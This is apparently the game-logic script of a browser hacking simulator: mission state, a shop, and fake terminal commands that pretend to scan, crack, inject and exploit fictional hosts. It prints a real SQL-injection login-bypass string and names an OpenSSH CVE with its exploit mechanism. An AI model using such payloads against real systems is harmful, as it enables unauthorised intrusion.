const G = {
  missionIdx:      0,
  missionsDone:    [],
  tools:           ['basic_cracker'],
  toolUpgrades:    [],
  crypto:          0,
  notoriety:       0,
  freeMode:        false,
  wipedHosts:      [],
  persistedHosts:  [],
  rootedHosts:     [],
  pivotRoutes:     [],
  osintDomains:    [],
  relayedHosts:    [],

  // Session-only (not saved)
  connected:       null,
  trace:           0,
  downloadedFiles: [],
  currentQuest:    null,
};

async function init() {
  let session;
  try { session = JSON.parse(localStorage.getItem('pg_session')); } catch {}
  if (!session?.userId) { window.location.href = '../'; return; }

  const username = session.username || 'ghost';
  document.getElementById('hud-user').textContent = username;
  document.getElementById('prompt').textContent   = `${username}@terminal:~$`;

  const saved = await loadCloud();
  if (saved) applyPayload(saved);

  updateHUD();
  updateSidebar();

  if (!localStorage.getItem('hacker_intro_seen')) {
    showIntro(username);
  } else {
    document.getElementById('intro-overlay').hidden = true;
    startMission(true);
  }
}

function applyPayload(saved) {
  G.missionIdx      = saved.missionIdx      ?? 0;
  G.missionsDone    = saved.missionsDone    ?? [];
  G.tools           = saved.tools           ?? ['basic_cracker'];
  G.toolUpgrades    = saved.toolUpgrades    ?? [];
  G.crypto          = saved.crypto          ?? 0;
  G.notoriety       = saved.notoriety       ?? 0;
  G.freeMode        = saved.freeMode        ?? (G.missionIdx >= MISSIONS.length);
  G.wipedHosts      = saved.wipedHosts      ?? [];
  G.persistedHosts  = saved.persistedHosts  ?? [];
  G.rootedHosts     = saved.rootedHosts     ?? [];
  G.pivotRoutes     = saved.pivotRoutes     ?? [];
  G.osintDomains    = saved.osintDomains    ?? [];
  G.relayedHosts    = saved.relayedHosts    ?? [];
  G.trace           = saved.trace           ?? 0;
  G.downloadedFiles = saved.downloadedFiles ?? [];
  if (saved.savedQuest) G.currentQuest = restoreQuest(saved.savedQuest);
}

function restoreQuest(data) {
  const file = data._file;
  return { ...data, check(G) { return G.downloadedFiles.includes(file); } };
}

async function saveState() {
  const savedQuest = G.currentQuest ? {
    id:        G.currentQuest.id,
    type:      G.currentQuest.type,
    company:   G.currentQuest.company,
    hostname:  G.currentQuest.hostname,
    title:     G.currentQuest.title,
    objective: G.currentQuest.objective,
    _file:     G.currentQuest._file,
    reward:    G.currentQuest.reward,
    target:    G.currentQuest.target,
    briefing:  G.currentQuest.briefing,
  } : null;
  await saveCloud({
    missionIdx:       G.missionIdx,
    missionsDone:     G.missionsDone,
    tools:            G.tools,
    toolUpgrades:     G.toolUpgrades,
    crypto:           G.crypto,
    notoriety:        G.notoriety,
    freeMode:         G.freeMode,
    wipedHosts:       G.wipedHosts,
    persistedHosts:   G.persistedHosts,
    rootedHosts:      G.rootedHosts,
    pivotRoutes:      G.pivotRoutes,
    osintDomains:     G.osintDomains,
    relayedHosts:     G.relayedHosts,
    trace:            G.trace,
    downloadedFiles:  G.downloadedFiles,
    savedQuest,
  });
}

// ── Intro ─────────────────────────────────────────────────────

function showIntro(username) {
  const overlay = document.getElementById('intro-overlay');
  const textEl  = document.getElementById('intro-text');
  overlay.hidden = false;

  const msg = `Welcome, ${username}.\n\nYour mentor is gone.\nThe system thinks it covered its tracks.\n\nFind the truth. Leave no trace.`;
  let i = 0;
  textEl.textContent = '';
  const iv = setInterval(() => {
    textEl.textContent += msg[i++];
    if (i >= msg.length) clearInterval(iv);
  }, 35);

  document.getElementById('intro-btn').addEventListener('click', () => {
    clearInterval(iv);
    overlay.hidden = true;
    localStorage.setItem('hacker_intro_seen', '1');
    startMission();
  }, { once: true });
}

// ── Mission / Free mode ───────────────────────────────────────

function getCurrentMission() {
  if (G.freeMode) return G.currentQuest;
  return MISSIONS[G.missionIdx] ?? null;
}

async function startMission(isResume = false) {
  G.connected = null;
  if (!isResume) { G.trace = 0; G.downloadedFiles = []; }
  updateHUD(); updateSidebar();

  if (G.freeMode || G.missionIdx >= MISSIONS.length) {
    if (isResume && G.freeMode) {
      await resumeFreeMode();
    } else {
      await enterFreeMode();
    }
    return;
  }

  if (isResume && G.downloadedFiles.length > 0) {
    await printLines([
      { type: 'sys',  text: '[ SESSION RESTORED ]' },
      { type: 'info', text: `Mission:  ${MISSIONS[G.missionIdx].title}` },
      { type: 'info', text: `Progress: ${G.downloadedFiles.length} file(s) downloaded` },
      { type: 'dim',  text: 'Type "status" for mission details.' },
    ], 40);
  } else {
    await printLines(MISSIONS[G.missionIdx].briefing, 60);
  }
  printEmpty();
}

async function enterFreeMode() {
  G.freeMode = true;
  G.currentQuest = null;
  await saveState(); updateHUD(); updateSidebar();

  await printLines([
    { type: 'sys',  text: '[ STORY MODE COMPLETE ]' },
    { type: 'info', text: '' },
    { type: 'info', text: 'You\'ve finished all available story chapters.' },
    { type: 'info', text: 'More chapters will drop — use "story" to check for updates.' },
    { type: 'info', text: '' },
    { type: 'info', text: 'In the meantime: anonymous contracts are available.' },
    { type: 'dim',  text: 'Type "quest" to receive your first contract.' },
  ], 55);
  printEmpty();
}

async function resumeFreeMode() {
  updateHUD(); updateSidebar();
  if (G.currentQuest) {
    await printLines([
      { type: 'sys',  text: '[ SESSION RESTORED ]' },
      { type: 'info', text: `Contract: ${G.currentQuest.title}` },
      { type: 'info', text: `Target:   ${G.currentQuest.target.ip}` },
      { type: 'info', text: `Objective: ${G.currentQuest.objective}` },
      { type: 'dim',  text: 'Type "status" for details or "quest" to see contract.' },
    ], 40);
  } else {
    await printLines([
      { type: 'sys',  text: '[ SESSION RESTORED — FREE MODE ]' },
      { type: 'dim',  text: 'Type "quest" to get a contract.' },
    ], 40);
  }
  printEmpty();
}

async function generateNewQuest() {
  G.currentQuest    = generateQuest(G.tools);
  G.connected       = null;
  G.trace           = 0;
  G.downloadedFiles = [];
  await saveState();
  updateHUD(); updateSidebar();
  await printLines(G.currentQuest.briefing, 50);
  printEmpty();
}

// ── Command router ────────────────────────────────────────────

async function handleCommand(raw) {
  const parts = raw.trim().split(/\s+/);
  const cmd   = parts[0].toLowerCase();
  const args  = parts.slice(1);

  setBusy(true);
  try {
    switch (cmd) {
      case 'help':       await cmdHelp();                    break;
      case 'whoami':     await cmdWhoami();                  break;
      case 'status':     await cmdStatus();                  break;
      case 'clear':      clearOutput();                      break;
      case 'quest':
      case 'contracts':  await cmdQuest();                   break;
      case 'story':      await cmdStory();                   break;
      case 'scan':       await cmdScan(args[0]);             break;
      case 'connect':    await cmdConnect(args[0], args[1]); break;
      case 'disconnect': await cmdDisconnect();              break;
      case 'crack':      await cmdCrack();                   break;
      case 'inject':     await cmdInject();                  break;
      case 'ls':         await cmdLs();                      break;
      case 'cat':        await cmdCat(args[0]);              break;
      case 'download':   await cmdDownload(args[0]);         break;
      case 'crypto':     printLine(`Wallet: ${G.crypto} CRYPTO`, 'out-ok'); break;
      case 'shop':
      case 'store':      await cmdShop(args);                break;
      case 'bribe':      await cmdBribe(args[0]);            break;
      case 'ping':       await cmdPing(args[0]);             break;
      case 'sniff':      await cmdSniff();                   break;
      case 'fuzz':       await cmdFuzz();                    break;
      case 'exploit':    await cmdExploit(args[0]);          break;
      case 'decrypt':    await cmdDecrypt(args[0]);          break;
      case 'wipe':       await cmdWipe();                    break;
      case 'stego':      await cmdStego(args[0]);            break;
      case 'persist':    await cmdPersist();                 break;
      case 'exfil':      await cmdExfil();                   break;
      case 'grep':       await cmdGrep(args[0], args[1]);    break;
      case 'enum':       await cmdEnum();                    break;
      case 'privesc':    await cmdPrivesc();                 break;
      case 'dump':       await cmdDump();                    break;
      case 'hash':       await cmdHash(args[0]);             break;
      case 'pivot':      await cmdPivot(args[0]);            break;
      case 'move':       await cmdMove(args[0], args[1]);    break;
      case 'osint':      await cmdOsint(args[0]);            break;
      case 'shell':      await cmdShell(args[0]);            break;
      case 'idor':       await cmdIdor(args[0]);             break;
      case 'ssrf':       await cmdSsrf(args[0]);             break;
      case 'lfi':        await cmdLfi(args[0]);              break;
      case 'xss':        await cmdXss();                     break;
      case 'kerberoast': await cmdKerberoast();              break;
      case 'asrep':      await cmdAsrep();                   break;
      case 'bloodhound': await cmdBloodhound();              break;
      case 'relay':      await cmdRelay();                   break;
      case 'inspect':    await cmdInspect(args[0]);          break;
      case 'logs':       await cmdLogs();                    break;
      default:
        printLine(`Command not found: ${cmd}  — type "help"`, 'out-err');
    }
  } finally {
    setBusy(false);
    printEmpty();
  }

  checkMissionComplete();
}

async function cmdHelp() {
  const showInject = G.tools.includes('sqli_kit') || (!G.freeMode && getCurrentMission()?.id === 'a1m2');
  const lines = [
    { type: 'sys',  text: '[ AVAILABLE COMMANDS ]' },
    { type: 'info', text: '  help                    — this message' },
    { type: 'info', text: '  whoami                  — your profile' },
    { type: 'info', text: '  status                  — current mission / contract' },
    { type: 'info', text: '  ping <ip>               — check if a host is reachable' },
    { type: 'info', text: '  scan <ip>               — find open ports on a target' },
    { type: 'info', text: '  connect <ip> <port>     — connect to a service' },
    { type: 'info', text: '  disconnect              — end current connection' },
    { type: 'info', text: '  crack                   — brute-force SSH password' },
  ];
  if (showInject)                            lines.push({ type: 'info', text: '  inject                  — SQL injection on web form' });
  if (G.tools.includes('packet_sniffer'))    lines.push({ type: 'info', text: '  sniff                   — capture cleartext traffic on connection' });
  if (G.tools.includes('fuzzer'))            lines.push({ type: 'info', text: '  fuzz                    — brute-force hidden HTTP endpoints' });
  if (G.tools.includes('exploit_db'))        lines.push({ type: 'info', text: '  exploit <CVE-ID>        — deploy a known CVE exploit' });
  lines.push(
    { type: 'info', text: '  ls                      — list files on connected server' },
    { type: 'info', text: '  cat <file>              — read a file' },
    { type: 'info', text: '  grep <pattern> <file>   — search inside a file' },
    { type: 'info', text: '  download <file>         — download a file' },
  );
  if (G.tools.includes('cryptobreaker'))     lines.push({ type: 'info', text: '  decrypt <file.enc>      — decrypt an AES-256 encrypted file' });
  if (G.tools.includes('steganographer'))    lines.push({ type: 'info', text: '  stego <image>           — extract hidden data from an image' });
  if (G.tools.includes('log_wiper'))         lines.push({ type: 'info', text: '  wipe                    — scrub auth logs on current host' });
  if (G.tools.includes('rootkit_mk2'))       lines.push({ type: 'info', text: '  persist                 — install persistent backdoor on host' });
  lines.push({ type: 'info', text: '  exfil                   — bulk-download all files from target' });
  lines.push({ type: 'info', text: '  enum                    — enumerate privesc vectors (LinPEAS-style)' });
  lines.push({ type: 'info', text: '  privesc                 — escalate privileges to root' });
  lines.push({ type: 'info', text: '  dump                    — extract credential hashes (/etc/shadow)' });
  if (G.tools.includes('hash_cracker'))      lines.push({ type: 'info', text: '  hash <file>             — crack password hashes offline (Hashcat)' });
  lines.push({ type: 'info', text: '  pivot <ip>              — tunnel traffic through compromised host' });
  lines.push({ type: 'info', text: '  move <ip>               — lateral movement via stolen credentials' });
  if (G.tools.includes('osint_suite'))       lines.push({ type: 'info', text: '  osint <domain>          — passive recon (emails, subdomains, leaks)' });
  if (G.tools.includes('shell_builder'))     lines.push({ type: 'info', text: '  shell [type]            — generate reverse shell payload' });
  lines.push({ type: 'info', text: '  idor <id>               — probe IDOR parameter on web endpoint' });
  lines.push({ type: 'info', text: '  ssrf <url>              — server-side request forgery attack' });
  lines.push({ type: 'info', text: '  lfi <path>              — local file inclusion / path traversal' });
  lines.push({ type: 'info', text: '  xss                     — inject XSS and capture session cookies' });
  if (G.tools.includes('ad_toolkit')) {
    lines.push({ type: 'info', text: '  kerberoast              — harvest and crack Kerberos service tickets' });
    lines.push({ type: 'info', text: '  asrep                   — AS-REP roasting on pre-auth disabled users' });
    lines.push({ type: 'info', text: '  bloodhound              — map Active Directory attack paths' });
  }
  lines.push({ type: 'info', text: '  relay                   — NTLM relay attack on network segment' });
  lines.push({ type: 'info', text: '  inspect <file>          — strings analysis for hardcoded secrets' });
  lines.push({ type: 'info', text: '  logs                    — analyse system logs for anomalies' });
  lines.push(
    { type: 'info', text: '  crypto                  — crypto balance' },
    { type: 'info', text: '  shop                    — browse the darknet marketplace' },
    { type: 'info', text: '  bribe <type>            — spend crypto for shortcuts' },
    { type: 'info', text: '  clear                   — clear terminal' },
  );
  if (G.freeMode) {
    lines.push(
      { type: 'sys',  text: '' },
      { type: 'sys',  text: '[ FREE MODE ]' },
      { type: 'info', text: '  quest                   — get / show current contract' },
      { type: 'info', text: '  story                   — check for new story chapters' },
    );
  }
  await printLines(lines, 18);
}

async function cmdWhoami() {
  let session;
  try { session = JSON.parse(localStorage.getItem('pg_session')); } catch {}
  const modNames = G.toolUpgrades.map(u => SHOP.upgrades.find(x => x.id === u)?.name ?? u);
  const lines = [
    { type: 'ok',   text: `User:         ${session?.username || 'ghost'}` },
    { type: 'info', text: `Mode:         ${G.freeMode ? 'Free Mode' : `Story — Act ${MISSIONS[G.missionIdx]?.act ?? '?'}`}` },
    { type: 'info', text: `Crypto:       ${G.crypto}` },
    { type: 'info', text: `Heat:         ${G.notoriety}%` },
    { type: 'info', text: `Tools:        ${G.tools.join(', ')}` },
    { type: 'info', text: `Story:        ${G.missionsDone.length} / ${MISSIONS.length} chapters` },
  ];
  if (modNames.length)              lines.push({ type: 'info', text: `Mods:         ${modNames.join(', ')}` });
  if (G.wipedHosts.length)          lines.push({ type: 'info', text: `Wiped hosts:  ${G.wipedHosts.join(', ')}` });
  if (G.persistedHosts.length)      lines.push({ type: 'info', text: `Backdoors:    ${G.persistedHosts.join(', ')}` });
  if (G.rootedHosts.length)         lines.push({ type: 'info', text: `Rooted:       ${G.rootedHosts.join(', ')}` });
  if (G.pivotRoutes.length)         lines.push({ type: 'info', text: `Pivot routes: ${G.pivotRoutes.join(', ')}` });
  if (G.osintDomains.length)        lines.push({ type: 'info', text: `OSINT'd:      ${G.osintDomains.join(', ')}` });
  if (G.relayedHosts.length)        lines.push({ type: 'info', text: `Relayed:      ${G.relayedHosts.join(', ')}` });
  await printLines(lines, 20);
}

async function cmdStatus() {
  const mission = getCurrentMission();
  const conn    = G.connected;
  const lines   = [];

  if (G.freeMode) {
    if (mission) {
      lines.push(
        { type: 'sys',  text: '[ ACTIVE CONTRACT ]' },
        { type: 'info', text: `Target:     ${mission.company}  (${mission.target.ip})` },
        { type: 'info', text: `Objective:  ${mission.objective}` },
        { type: 'info', text: `Payout:     ${mission.reward.crypto} CRYPTO` },
      );
    } else {
      lines.push(
        { type: 'sys',  text: '[ FREE MODE — NO ACTIVE CONTRACT ]' },
        { type: 'dim',  text: 'Type "quest" to get a contract.' },
      );
    }
  } else {
    lines.push(
      { type: 'sys',  text: mission ? `[ ACT ${mission.act} — ${mission.title.toUpperCase()} ]` : '[ NO ACTIVE MISSION ]' },
      { type: 'info', text: `Objective:  ${mission?.objective ?? '—'}` },
    );
  }

  lines.push(
    { type: conn ? 'ok' : 'dim', text: `Connection: ${conn ? `${conn.ip}:${conn.port} (${conn.service})${conn.authed ? ' ✓' : ' — not authenticated'}` : 'Offline'}` },
    { type: G.trace > 60 ? 'warn' : 'info', text: `Trace:      ${Math.round(G.trace)}%` },
  );
  await printLines(lines, 20);
}

async function cmdQuest() {
  if (!G.freeMode) { printLine('[!] Contracts are only available in Free Mode.', 'out-err'); return; }

  // Active quest not yet completed — show it
  if (G.currentQuest && !G.downloadedFiles.includes(G.currentQuest._file)) {
    await printLines([
      { type: 'sys',  text: '[ ACTIVE CONTRACT ]' },
      { type: 'info', text: `Target:    ${G.currentQuest.company}` },
      { type: 'warn', text: `IP:        ${G.currentQuest.target.ip}` },
      { type: 'info', text: `Objective: ${G.currentQuest.objective}` },
      { type: 'info', text: `Payout:    ${G.currentQuest.reward.crypto} CRYPTO` },
    ], 20);
    return;
  }

  printLine('[*] Fetching new contract...', 'out-dim');
  await delay(700);
  await generateNewQuest();
}

async function cmdStory() {
  if (!G.freeMode) { printLine('[*] You are already in story mode.', 'out-dim'); return; }

  if (G.missionIdx < MISSIONS.length) {
    // New chapters are available
    printLine('[+] New story chapter detected! Switching to story mode...', 'out-ok');
    await delay(600);
    G.freeMode = false;
    G.currentQuest = null;
    clearOutput();
    await startMission();
  } else {
    await printLines([
      { type: 'sys',  text: '[ STORY STATUS ]' },
      { type: 'info', text: `Chapters completed: ${G.missionsDone.length} / ${MISSIONS.length}` },
      { type: 'dim',  text: 'No new chapters yet. Check back soon.' },
    ], 20);
  }
}

// ── Target resolution (story mission or free quest) ───────────

function getActiveTarget() {
  return getCurrentMission()?.target ?? null;
}

async function cmdScan(ip) {
  if (!ip) { printLine('Usage: scan <ip>', 'out-err'); return; }
  const target = getActiveTarget();
  if (!target) { printLine('[!] No target in scope. ' + (G.freeMode ? 'Type "quest" to get a contract.' : ''), 'out-err'); return; }
  if (ip !== target.ip) { addTrace(10); printLine(`[!] ${ip}: Host unreachable or not in scope.`, 'out-err'); return; }

  const hasPro = G.tools.includes('port_scanner_pro');
  printLine(`[*] Scanning ${ip}${hasPro ? ' (deep scan)' : ''}...`, 'out-info');
  await printProgress('[*] Port scan', hasPro ? 900 : 1200);
  printLine(`[+] Host: ${target.hostname} (${ip})`, 'out-ok');
  printEmpty();
  for (const [port, info] of Object.entries(target.ports)) {
    if (info.hidden && !hasPro) continue;
    await delay(80);
    const tag = info.hidden ? '[STEALTH]' : '[OPEN]   ';
    printLine(`    ${String(port).padEnd(6)} ${tag}  ${info.service.padEnd(6)}  ${info.banner}`, 'out-info');
  }
  if (!hasPro && Object.values(target.ports).some(p => p.hidden)) {
    printLine('    [*] Some stealth ports may be hidden — use port_scanner_pro.', 'out-dim');
  }
}

async function cmdConnect(ip, portStr) {
  if (!ip || !portStr) { printLine('Usage: connect <ip> <port>', 'out-err'); return; }
  const target = getActiveTarget();
  if (!target) { printLine('[!] No target in scope.', 'out-err'); return; }
  if (ip !== target.ip) { addTrace(5); printLine(`[!] ${ip}: Host unreachable.`, 'out-err'); return; }

  const port     = parseInt(portStr);
  const portInfo = target.ports[port];
  if (!portInfo) { addTrace(5); printLine(`[!] Port ${port} is closed or filtered.`, 'out-err'); return; }

  if (G.connected) await cmdDisconnect(true);

  const isPersisted = G.persistedHosts.includes(ip);
  G.connected = { ip, port, service: portInfo.service, authed: isPersisted };
  updateHUD(); updateSidebar();

  printLine(`[+] Connected to ${ip}:${port} (${portInfo.service})`, 'out-ok');
  printLine(`    ${portInfo.banner}`, 'out-dim');
  if (isPersisted) {
    printLine('[+] Backdoor detected — auto-authenticated via Rootkit Mk.II.', 'out-ok');
  } else if (portInfo.service === 'SSH') {
    printLine('[*] Authentication required — use "crack"', 'out-info');
  } else if (portInfo.service === 'HTTP' || portInfo.service === 'HTTPS') {
    printLine('[*] Web service — use "inject" to probe login form', 'out-info');
  }
}

async function cmdDisconnect(silent = false) {
  if (!G.connected) { if (!silent) printLine('Not connected.', 'out-dim'); return; }
  const { ip, port } = G.connected;
  G.connected = null;
  G.trace = Math.max(0, G.trace - 8);
  updateHUD(); updateSidebar();
  if (!silent) printLine(`[*] Disconnected from ${ip}:${port}.`, 'out-dim');
}

async function cmdCrack() {
  if (!G.connected)                        { printLine('Not connected to any host.', 'out-err'); return; }
  if (G.connected.service !== 'SSH')       { printLine('[!] crack only works on SSH services.', 'out-err'); return; }
  if (G.connected.authed)                  { printLine('[*] Already authenticated.', 'out-dim'); return; }

  const portInfo = getActiveTarget()?.ports[G.connected.port];
  if (!portInfo?.crackable) {
    addTrace(15);
    if (portInfo?.cve) {
      printLine(`[!] Brute-force blocked — this service is hardened.`, 'out-err');
      printLine(`[*] However, a known vulnerability was detected: ${portInfo.cve}`, 'out-warn');
      printLine(`[*] Use "exploit ${portInfo.cve}" if you have ExploitDB Client.`, 'out-info');
    } else {
      printLine('[!] This service has hardened auth — tool insufficient.', 'out-err');
    }
    return;
  }
  if (portInfo.complexity === 'medium' && !G.tools.includes('wordlist_pro')) {
    addTrace(10); printLine('[!] Password complexity too high for Basic Cracker. Need Wordlist Pro.', 'out-err'); return;
  }
  if (portInfo.complexity === 'high' && !G.tools.includes('bruteforce_v2')) {
    addTrace(12); printLine('[!] Password complexity too high. Bruteforce v2 required.', 'out-err'); return;
  }

  const hasElite   = G.toolUpgrades.includes('wordlist_elite');
  const hasCluster = G.toolUpgrades.includes('gpu_cluster');
  const duration = portInfo.complexity === 'high'   ? (hasCluster ? 1800 : 3500)
                 : portInfo.complexity === 'medium'  ? (hasElite   ? 1400 : 2800) : 2000;
  const traceHit = portInfo.complexity === 'high'   ? (hasCluster ? 16 : 30)
                 : portInfo.complexity === 'medium'  ? (hasElite   ?  8 : 20) : 20;
  const label    = portInfo.complexity === 'high'   ? (hasCluster ? '[*] Distributed GPU crack' : '[*] GPU brute force')
                 : '[*] Trying common passwords';
  printLine('[*] Initiating brute force on SSH service...', 'out-info');
  await printProgress(label, duration);
  G.connected.authed = true;
  addTrace(traceHit);
  updateHUD(); updateSidebar();
  printLine(`[+] Password found: ${portInfo.password}`, 'out-ok');
  printLine('[+] Authentication successful. Shell access granted.', 'out-ok');
}

async function cmdInject() {
  if (!G.connected)                                                        { printLine('Not connected to any host.', 'out-err'); return; }
  if (G.connected.service !== 'HTTP' && G.connected.service !== 'HTTPS')  { printLine('[!] inject only works on HTTP/HTTPS services.', 'out-err'); return; }
  if (G.connected.authed)                                                  { printLine('[*] Already have database access.', 'out-dim'); return; }

  const portInfo = getActiveTarget()?.ports[G.connected.port];
  if (!portInfo?.injectable && !G.toolUpgrades.includes('exploit_kit')) {
    addTrace(10); printLine('[!] No injectable endpoint. Exploit Kit required for hardened targets.', 'out-err'); return;
  }

  printLine("[*] Probing login form for SQL injection...", 'out-info');
  await delay(500);
  printLine("[*] Payload: ' OR '1'='1' --", 'out-dim');
  await printProgress('[*] Injecting', 1800);
  G.connected.authed = true;
  addTrace(25);
  updateHUD(); updateSidebar();
  printLine("[+] Vulnerability confirmed. Bypassing authentication...", 'out-ok');
  printLine("[+] Database shell acquired.", 'out-ok');
}

async function cmdLs() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated. Connect and authenticate first.', 'out-err'); return; }
  const files = getActiveTarget()?.files;
  if (!files || Object.keys(files).length === 0) { printLine('No files.', 'out-dim'); return; }
  printLine('[*] Directory listing:', 'out-info');
  for (const [name, content] of Object.entries(files)) {
    await delay(40);
    printLine(`    ${name.padEnd(32)} ${(content.length * 1.1).toFixed(0)} bytes`, 'out-info');
  }
}

async function cmdCat(filename) {
  if (!filename) { printLine('Usage: cat <file>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const content = getActiveTarget()?.files?.[filename];
  if (content === undefined) { addTrace(2); printLine(`[!] File not found: ${filename}`, 'out-err'); return; }
  printLine(`[*] ${filename}:`, 'out-dim');
  printEmpty();
  for (const line of content.split('\n')) { await delay(18); printLine(`    ${line}`, 'out-info'); }
}

async function cmdDownload(filename) {
  if (!filename) { printLine('Usage: download <file>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  const content = getActiveTarget()?.files?.[filename];
  if (content === undefined) { addTrace(3); printLine(`[!] File not found: ${filename}`, 'out-err'); return; }
  printLine(`[*] Downloading ${filename}...`, 'out-info');
  await printProgress('[*] Transfer', 800);
  if (!G.downloadedFiles.includes(filename)) G.downloadedFiles.push(filename);
  addTrace(5);
  await saveState();
  printLine(`[+] Downloaded: ${filename}`, 'out-ok');
}

// ── New commands ──────────────────────────────────────────────

async function cmdPing(ip) {
  if (!ip) { printLine('Usage: ping <ip>', 'out-err'); return; }
  const target = getActiveTarget();
  if (!target || ip !== target.ip) {
    addTrace(3);
    printLine(`[*] PING ${ip} — sending 4 ICMP echo requests...`, 'out-info');
    await delay(600);
    printLine(`[!] Request timeout for icmp_seq 0-3`, 'out-err');
    printLine(`    0 packets received, 100% packet loss.`, 'out-dim');
    return;
  }
  printLine(`[*] PING ${ip} (${target.hostname}) — 56 bytes of data`, 'out-info');
  const rtts = [12, 11, 13, 12].map(r => r + Math.floor(Math.random() * 4));
  for (const rtt of rtts) {
    await delay(300);
    printLine(`    64 bytes from ${ip}: icmp_seq=${rtts.indexOf(rtt)} ttl=64 time=${rtt} ms`, 'out-dim');
  }
  const avg = Math.round(rtts.reduce((a, b) => a + b) / rtts.length);
  printLine(`[+] ${target.hostname} is up. avg RTT: ${avg} ms`, 'out-ok');
}

async function cmdSniff() {
  if (!G.connected) { printLine('Not connected to any host.', 'out-err'); return; }
  if (!G.tools.includes('packet_sniffer')) {
    printLine('[!] Packet Sniffer not installed — buy it from the shop.', 'out-err'); return;
  }
  const target = getActiveTarget();
  const captureFiles = target?.captureFiles;
  if (!captureFiles || Object.keys(captureFiles).length === 0) {
    addTrace(8);
    printLine(`[*] Sniffing traffic on ${G.connected.ip}:${G.connected.port}...`, 'out-info');
    await printProgress('[*] Capturing', 1500);
    printLine('[*] No cleartext credentials detected in captured traffic.', 'out-dim');
    return;
  }
  const hasDeep = G.toolUpgrades.includes('deep_packet');
  printLine(`[*] Attaching sniffer to ${G.connected.service} stream on ${G.connected.ip}:${G.connected.port}...`, 'out-info');
  if (hasDeep) printLine('[*] Deep Packet Inspector active — full protocol decode enabled.', 'out-dim');
  await printProgress('[*] Capturing packets', hasDeep ? 1200 : 2200);
  const count = 600 + Math.floor(Math.random() * 400);
  printLine(`[+] Captured ${count} packets.`, 'out-ok');
  addTrace(hasDeep ? 10 : 18);
  for (const [fname, content] of Object.entries(captureFiles)) {
    target.files[fname] = content;
    await delay(200);
    printLine(`[+] Cleartext credential stream detected — saved: ${fname}`, 'out-ok');
  }
  printLine('[*] Use "ls" to see captured files, then "download <file>".', 'out-dim');
  await saveState();
}

async function cmdFuzz() {
  if (!G.connected) { printLine('Not connected to any host.', 'out-err'); return; }
  if (G.connected.service !== 'HTTP' && G.connected.service !== 'HTTPS') {
    printLine('[!] fuzz only works on HTTP/HTTPS services.', 'out-err'); return;
  }
  if (!G.tools.includes('fuzzer')) {
    printLine('[!] HTTP Fuzzer not installed — buy it from the shop.', 'out-err'); return;
  }
  if (G.connected.authed) { printLine('[*] Already have access on this connection.', 'out-dim'); return; }
  const target = getActiveTarget();
  const portInfo = target?.ports[G.connected.port];
  if (!portInfo?.fuzzable) {
    addTrace(12);
    printLine('[!] No hidden endpoints found. Target may not be fuzzable.', 'out-err'); return;
  }
  const hasTurbo = G.toolUpgrades.includes('fuzz_turbo');
  const duration  = hasTurbo ? 1800 : 3200;
  const traceHit  = hasTurbo ? 18 : 28;
  printLine(`[*] Starting HTTP directory fuzzing on ${G.connected.ip}:${G.connected.port}...`, 'out-info');
  printLine(`[*] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt`, 'out-dim');
  printLine(`[*] Threads: ${hasTurbo ? 80 : 40}  |  Extensions: php,html,txt,db,json`, 'out-dim');
  await printProgress('[*] Fuzzing', duration);
  addTrace(traceHit);
  if (target.fuzzFiles) {
    for (const [fname, content] of Object.entries(target.fuzzFiles)) {
      target.files[fname] = content;
      await delay(150);
      printLine(`[+] Found: /admin/${fname}  [200 OK]`, 'out-ok');
    }
  }
  G.connected.authed = true;
  updateHUD(); updateSidebar();
  printLine('[+] Admin panel access gained. Shell authenticated.', 'out-ok');
  printLine('[*] Use "ls" to list discovered files.', 'out-dim');
  await saveState();
}

async function cmdExploit(cve) {
  if (!cve) { printLine('Usage: exploit <CVE-ID>  (e.g. exploit CVE-2023-38408)', 'out-err'); return; }
  if (!G.connected) { printLine('Not connected to any host.', 'out-err'); return; }
  if (!G.tools.includes('exploit_db')) {
    printLine('[!] ExploitDB Client not installed — buy it from the shop.', 'out-err'); return;
  }
  if (G.connected.authed) { printLine('[*] Already authenticated.', 'out-dim'); return; }
  const portInfo = getActiveTarget()?.ports[G.connected.port];
  const hasZeroDay = G.toolUpgrades.includes('zero_day');
  if (!hasZeroDay && portInfo?.cve?.toUpperCase() !== cve.toUpperCase()) {
    addTrace(20);
    printLine(`[!] Exploit failed — ${cve} does not match this service's vulnerability profile.`, 'out-err');
    printLine('[*] Scan the target first to identify the correct CVE.', 'out-dim');
    return;
  }
  const matchedCve = portInfo?.cve || cve;
  printLine(`[*] Loading exploit module for ${matchedCve}...`, 'out-info');
  await delay(400);
  if (matchedCve.toUpperCase() === 'CVE-2023-38408') {
    printLine('[*] Target: OpenSSH ssh-agent forwarding RCE', 'out-dim');
    printLine('[*] Triggering malicious PKCS#11 library load via agent socket...', 'out-dim');
  }
  await printProgress('[*] Exploiting', 2800);
  addTrace(35);
  G.connected.authed = true;
  updateHUD(); updateSidebar();
  printLine(`[+] ${matchedCve} — exploit successful. Root shell obtained.`, 'out-ok');
  printLine('[+] Authentication bypassed via remote code execution.', 'out-ok');
  await saveState();
}

async function cmdDecrypt(filename) {
  if (!filename) { printLine('Usage: decrypt <file.enc>', 'out-err'); return; }
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
  if (!G.tools.includes('cryptobreaker')) {
    printLine('[!] CryptoBreaker not installed — buy it from the shop.', 'out-err'); return;
  }
  if (!filename.endsWith('.enc')) {
    printLine('[!] decrypt only works on .enc files.', 'out-err'); return;
  }
  const target = getActiveTarget();
  if (!target?.files?.[filename]) { addTrace(3); printLine(`[!] File not found: ${filename}`, 'out-err'); return; }
  const entry = target?.decryptedFiles?.[filename];
  if (!entry) {
    addTrace(10);
    printLine('[!] No key material found for this file. Obtain the encryption key first.', 'out-err');
    return;
  }
  printLine(`[*] Loading key derivation from helios_key.bin...`, 'out-info');
  await delay(400);
  printLine(`[*] Cipher: AES-256-CBC  |  Mode: PBKDF2 key derivation`, 'out-dim');
  await printProgress('[*] Decrypting', 2200);
  addTrace(12);
  target.files[entry.name] = entry.content;
  printLine(`[+] Decryption successful — output: ${entry.name}`, 'out-ok');
  printLine('[*] Use "download ' + entry.name + '" to retrieve the file.', 'out-dim');
  await saveState();
}

async function cmdWipe() {
  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
